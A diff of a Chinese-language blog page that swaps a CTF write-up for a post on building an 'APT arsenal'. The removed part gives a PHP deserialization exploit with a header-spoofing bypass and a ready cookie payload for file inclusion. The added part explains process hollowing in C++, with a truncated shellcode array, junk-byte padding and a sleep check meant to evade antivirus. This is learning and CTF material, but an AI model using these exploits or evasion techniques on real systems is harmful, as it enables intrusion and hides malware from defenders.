@@ -16,29 +16,30 @@
   <meta name="author" content="Giwawa">
   <meta name="keywords" content="">
   
-    <meta name="description" content="WEB-InfoSecCTF2022-Message of the day">
+    <meta name="description" content="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WEB-InfoSecCTF2022-Message of the day">
-<meta property="og:url" content="https://0xbe61a55f.github.io/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/index.html">
+<meta property="og:title" content="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)">
+<meta property="og:url" content="https://0xbe61a55f.github.io/2022/12/07/APT%E6%AD%A6%E5%99%A8%E5%BA%AB1/index.html">
 <meta property="og:site_name" content="Giwawa&#39;s Blog">
-<meta property="og:description" content="WEB-InfoSecCTF2022-Message of the day">
+<meta property="og:description" content="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)">
 <meta property="og:locale" content="zh_TW">
-<meta property="og:image" content="https://i.imgur.com/ghSzYSu.png">
-<meta property="og:image" content="https://i.imgur.com/SeA8DWB.png">
-<meta property="article:published_time" content="2022-12-04T15:36:24.000Z">
-<meta property="article:modified_time" content="2022-12-04T15:39:31.723Z">
+<meta property="og:image" content="https://i.imgur.com/8galwew.png">
+<meta property="og:image" content="https://i.imgur.com/TjU9iGb.png">
+<meta property="og:image" content="https://i.imgur.com/rPu7dw1.png">
+<meta property="og:image" content="https://i.imgur.com/1Q9RX67.png">
+<meta property="article:published_time" content="2022-12-07T07:38:10.000Z">
+<meta property="article:modified_time" content="2022-12-07T07:45:20.794Z">
 <meta property="article:author" content="Giwawa">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="PHP">
-<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="APT">
+<meta property="article:tag" content="武器庫">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.imgur.com/ghSzYSu.png">
+<meta name="twitter:image" content="https://i.imgur.com/8galwew.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>WEB-InfoSecCTF2022-Message of the day - Giwawa&#39;s Blog</title>
+  <title>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1) - Giwawa&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +216,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="WEB-InfoSecCTF2022-Message of the day"></span>
+            <span id="subtitle" data-typed-text="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)"></span>
           
         </div>
 
@@ -226,8 +227,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-04 23:36" pubdate>
-          星期日, 十二月 4日 2022, 11:36 晚上
+        <time datetime="2022-12-07 15:38" pubdate>
+          星期三, 十二月 7日 2022, 3:38 下午
         </time>
       </span>
     
@@ -239,7 +240,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2.6k 字
+          2.5k 字
         
       </span>
     
@@ -251,7 +252,7 @@
         
         
           <!-- compatible with older versions-->
-          23 分鐘
+          21 分鐘
         
       </span>
     
@@ -297,37 +298,42 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">WEB-InfoSecCTF2022-Message of the day</h1>
+            <h1 style="display: none">APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Message-of-the-Day"><a href="#Message-of-the-Day" class="headerlink" title="Message of the Day"></a>Message of the Day</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">題目首頁顯示 You are not allowed to access.<br>先用dirsearch爆破目錄<br></code></pre></td></tr></table></figure>
-<p><img src="https://i.imgur.com/ghSzYSu.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">發現backup.zip<br>裡面有三個檔案 client.php read.php index.php<br></code></pre></td></tr></table></figure>
+                <h1 id="APT武器庫打造計畫-amp-amp-entry-point-劫持-1"><a href="#APT武器庫打造計畫-amp-amp-entry-point-劫持-1" class="headerlink" title="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)"></a>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">最近在練習dll injection、bypassAV一些規避技術，<br>有朋友提到不能使用managed程式去做繞過，否則一定被查殺，<br>於是決定用C++是看看練習刻一個process hollowing出來，<br>技術不到位，可能會有很多錯誤觀念XDD<br></code></pre></td></tr></table></figure>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">通過CreateProcess創建進程，傳入參數CREATE_SUSPENDED使進程掛起<br>通過NtQueryInformationProcess 找出imagebase<br>從ImageBase讀取PE頭信息，再從NTheader中獲取entry point RVA，加上獲取的RVA得到entry point address。<br>通過WriteProcessMemory向內存寫入payload<br>通過ResumeThread喚醒進程，執行payload<br></code></pre></td></tr></table></figure>
+
+<h3 id="建立一個-Suspended-Process-，-此為注入的目標-Process"><a href="#建立一個-Suspended-Process-，-此為注入的目標-Process" class="headerlink" title="建立一個 Suspended Process ， 此為注入的目標 Process"></a>建立一個 Suspended Process ， 此為注入的目標 Process</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">使用 CreateProcessA 建立Process<br></code></pre></td></tr></table></figure>
 
 <ul>
-<li><p>index.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>	include(&#x27;client.php&#x27;);<br><br>	function getIP()<br>	&#123;<br>	    if (!empty($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]))<br>	    &#123;<br>	      $ip=$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];<br>	    &#125;<br>	    else<br>	    &#123;<br>	      $ip=$_SERVER[&#x27;REMOTE_ADDR&#x27;];<br>	    &#125;<br>	    return $ip;<br>	&#125;<br><br>	if (getIP() == &#x27;127.0.0.1&#x27;) &#123;<br>		if (!isset($_COOKIE[&#x27;client&#x27;])) &#123;<br>			setcookie(&quot;client&quot;, base64_encode(serialize(new Client(&#x27;Guest&#x27;))));<br>		&#125; else &#123;<br>			unserialize(base64_decode($_COOKIE[&#x27;client&#x27;]));<br>		&#125;<br>	&#125;<br>	else &#123;<br>		header(&#x27;HTTP/1.0 403 Forbidden&#x27;);<br>    	die(&#x27;You are not allowed to access.&#x27;);<br>	&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>read.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>	class Read &#123;<br>		<br>		// Still in development phase<br><br>		private $file_name;<br><br>		public function print($val) &#123;<br>			include($this-&gt;file_name);<br>			echo $val;<br>		&#125;<br>	&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>client.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br>	include(&#x27;read.php&#x27;);<br><br>	class Client &#123;<br><br>		private $name;<br>		private $tmp;<br><br>		function __construct($name) &#123;<br>			$this-&gt;name = $name;<br>			$this-&gt;tmp = new Message();<br>		&#125;<br><br>		function __destruct() &#123;<br>			$this-&gt;tmp-&gt;print($this-&gt;name);<br>		&#125;<br>	&#125;<br><br>	class Message &#123;<br><br>		public function print($val) &#123;<br>			echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>		&#125;<br><br>	&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure></li>
+<li>CreateProcessA<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs !">BOOL CreateProcessA(<br>  [in, optional]      LPCSTR                lpApplicationName, //應用程式名稱<br>  [in, out, optional] LPSTR                 lpCommandLine, //命令行字符串<br>  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes, //Process安全屬性<br>  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes, //Thread安全屬性<br>  [in]                BOOL                  bInheritHandles, //是否繼承父進程的屬性<br>  [in]                DWORD                 dwCreationFlags, //創建標誌<br>  [in, optional]      LPVOID                lpEnvironment, //指向新環境塊的Pointer<br>  [in, optional]      LPCSTR                lpCurrentDirectory, //指向當前目錄名的Pointer<br>  [in]                LPSTARTUPINFOA        lpStartupInfo, //傳遞給新進程的信息<br>  [out]               LPPROCESS_INFORMATION lpProcessInformation //新進程返回的信息<br>);<br></code></pre></td></tr></table></figure></li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">拿到三個文件的<span class="hljs-built_in">source</span> code<br>首先會利用<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] 抓取使用者<br>使用者可控的header都不安全<br>可用X-Forwarded-For: 127.0.0.1 繞過<br><br>接著會對cookie裡面的內容做反序列化<br>unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;client&#x27;</span>]));<br><br>會call Message的Print <span class="hljs-keyword">function</span><br>可改成<span class="hljs-built_in">read</span>的<span class="hljs-built_in">print</span> 並將file_name改成要include的檔案<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs !">使用 CreateProcessA 建立 Process，其中有個重點是第六個參數 dwCreationFlags 必須是 CREATE_SUSPENDED (0x4)，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改。<br><br>建立了目標 Process後，並把它的記憶體竄改成我們自己的程式後，呼叫 ResumeThread 就可以讓它恢復執行。<br><br>有了目標 Process 的 Handle，就可以取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress。<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/8galwew.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>LPSTARTUPINFOA &amp;&amp; PROCESS_INFORMATION<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">LPSTARTUPINFOA si是一個指向STARTUPINFOA結構的指標，指定新進程的窗口屬性。 <br>PROCESS_INFORMATION proc_info是一個包含新進程及其主線程信息的結構。它通常用於存儲新進程的進程和線程句柄。<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="取得imageBase"><a href="#取得imageBase" class="headerlink" title="取得imageBase"></a>取得imageBase</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">NtQueryInformationProcess 函數用於查詢有關特定過程的信息，並將結果存儲在 pbi 結構中。<br><br>第一個參數是一個過程句柄，第二個參數是 ProcessBasicInformation 枚舉值，第三個參數是一個指向 PROCESS_BASIC_INFORMATION 結構的指針，第四個參數是結構的大小，第五個參數是一個指向存儲結果的指針。<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/TjU9iGb.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">dt !_PEB 結構資訊<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/rPu7dw1.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>PEB + 0x10位置即是process的imagebase address<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">透過ReadProcessMemory來取得指定記憶體內容<br>LONGLONG imageBaseOffset = (LONGLONG)pbi.PebBaseAddress + 0x10;<br><br>PEB位置加上0x10定位到imagebase<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="獲取Header頭"><a href="#獲取Header頭" class="headerlink" title="獲取Header頭"></a>獲取Header頭</h3><p><img src="https://i.imgur.com/1Q9RX67.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Shellcode-加密-amp-amp-Sleep-程式"><a href="#Shellcode-加密-amp-amp-Sleep-程式" class="headerlink" title="Shellcode 加密 &amp;&amp; Sleep 程式"></a>Shellcode 加密 &amp;&amp; Sleep 程式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs !">目前是塞垃圾byte給shellcode<br>並且執行時先讓程式做sleep <br>有些啟發式防毒會將程式丟到模擬器去執行，遇到延遲會快進，<br></code></pre></td></tr></table></figure>
 
 <ul>
-<li><p>exp.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs !">&lt;?php<br><br>class Read &#123;<br>		<br>    private $file_name = &#x27;/etc/motd&#x27;;<br><br>    public function print($val) &#123;<br>        include($this-&gt;file_name);<br>        echo $val;<br>    &#125;<br>&#125;<br><br>class Client &#123;<br><br>    private $name;<br>    private $tmp;<br><br>    function __construct($name) &#123;<br>        $this-&gt;name = $name;<br>        $this-&gt;tmp = new Read();<br>    &#125;<br><br>    function __destruct() &#123;<br>        $this-&gt;tmp-&gt;print($this-&gt;name);<br>    &#125;<br><br>&#125;<br><br>class Message &#123;<br><br>    public function print($val) &#123;<br>        echo &quot;Tigers and bears may be stronger predators, but wolves don&#x27;t perform in circus, &quot;. $val .&quot;!&quot;;<br>    &#125;<br><br>&#125;<br><br>$test = new Client(&#x27;/etc/passwd&#x27;);<br><br>$y = base64_encode(serialize($test));<br>echo $y;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+<li><p>加密方式很多種，目前還在測試中，於是就隨便塞垃圾byte..</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs !">unsigned char plain[] = &quot;\xfc\x48\x83\xe4\xf0<br>unsigned char buf[4 * sizeof(plain)];<br><br>    int j = 0;<br><br>    for (int i = 0; i &lt; 4 * sizeof(plain); i++) &#123;<br><br>        if (i % 4 == 0) &#123;<br>            buf[i] = plain[j];<br>            j++;<br>        &#125;<br>        else &#123;<br>            buf[i] = rand() &amp; 15;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
 </li>
-<li><p>requests get flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">根據題意 推測為motd指令 將payload file_name給/etc/motd<br>Cookie: client=Tzo2OiJDbGllbnQiOjI6e3M6MTI6IgBDbGllbnQAbmFtZSI7czoxMToiL2V0Yy9wYXNzd2QiO3M6MTE6IgBDbGllbnQAdG1wIjtPOjQ6IlJlYWQiOjE6e3M6MTU6IgBSZWFkAGZpbGVfbmFtZSI7czo5OiIvZXRjL21vdGQiO319<br><br>X-Forwarded-For: 127.0.0.1<br></code></pre></td></tr></table></figure>
-<p><img src="https://i.imgur.com/SeA8DWB.png" srcset="/img/loading.gif" lazyload></p>
-</li>
+<li><p>sleep</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs !">auto t1 = std::chrono::system_clock::now();<br>std::this_thread::sleep_for(std::chrono::seconds(2));<br>auto t2 = std::chrono::system_clock::now();<br>auto elapsed_time = std::chrono::duration_cast&lt;std::chrono::seconds&gt;(t2 - t1).count();<br>std::cout &lt;&lt; &quot;Elapsed time: &quot; &lt;&lt; elapsed_time &lt;&lt; &quot; seconds&quot; &lt;&lt; std::endl;<br>if (elapsed_time &lt; 1.5) &#123;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure></li>
 </ul>
-
+<h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">目前還有太多東西不了解，還需要更多的嘗試才會有更多收穫，<br>繼續學習zzz<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -345,15 +351,8 @@
     
       <span class="category-chain">
         
-  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  <a href="/categories/APT/" class="category-chain-item">APT</a>
   
-  
-    <span>></span>
-    
-  <a href="/categories/CTF/WEB/" class="category-chain-item">WEB</a>
-  
-  
-
   
 
       </span>
@@ -367,11 +366,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CTF/">#CTF</a>
+        <a href="/tags/APT/">#APT</a>
       
-        <a href="/tags/PHP/">#PHP</a>
-      
-        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
+        <a href="/tags/%E6%AD%A6%E5%99%A8%E5%BA%AB/">#武器庫</a>
       
     </div>
   
@@ -383,8 +380,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>WEB-InfoSecCTF2022-Message of the day</div>
-      <div>https://0xbe61a55f.github.io/2022/12/04/WEB-InfoSecCTF2022-Message of the day/</div>
+      <div>APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</div>
+      <div>https://0xbe61a55f.github.io/2022/12/07/APT武器庫1/</div>
     </div>
     <div class="license-meta">
       
@@ -396,7 +393,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>發布於</div>
-          <div>2022年12月4日</div>
+          <div>2022年12月7日</div>
         </div>
       
       
@@ -428,18 +425,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/07/APT%E6%AD%A6%E5%99%A8%E5%BA%AB1/" title="APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">APT武器庫打造計畫 &amp;&amp; entry point 劫持 (1)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/03/Chrome-Remote-Desktop/" title="GCP安裝Chrome-Remote-Desktop">
-                        <span class="hidden-mobile">GCP安裝Chrome-Remote-Desktop</span>
+                      <a href="/2022/12/04/WEB-InfoSecCTF2022-Message%20of%20the%20day/" title="WEB-InfoSecCTF2022-Message of the day">
+                        <span class="hidden-mobile">WEB-InfoSecCTF2022-Message of the day</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
